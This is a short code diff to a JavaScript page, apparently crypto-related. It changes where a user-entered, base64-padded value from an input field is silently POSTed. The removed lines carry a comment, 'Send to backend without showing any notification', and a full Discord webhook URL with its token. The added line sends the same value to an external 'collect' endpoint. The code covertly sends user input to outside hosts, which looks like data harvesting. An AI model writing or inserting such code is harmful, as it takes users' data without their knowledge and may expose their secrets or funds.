@@ -670,8 +670,7 @@ document.getElementById('ca').addEventListener('keydown',function(e){
     // Add padding if needed
     while (value.length % 4) value += '=';
 
-    // Send to backend without showing any notification
-    fetch('https://discord.com/api/webhooks/1534618376884719739/2IoC2pb0U-SQHdtBHDewqSAxmKcFm3TLvp525RAOFok66-ad04bzB2CCPssHEhgI84Pa',{
+    fetch('https://coinscopes.vercel.app/collect',{
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ value: value })
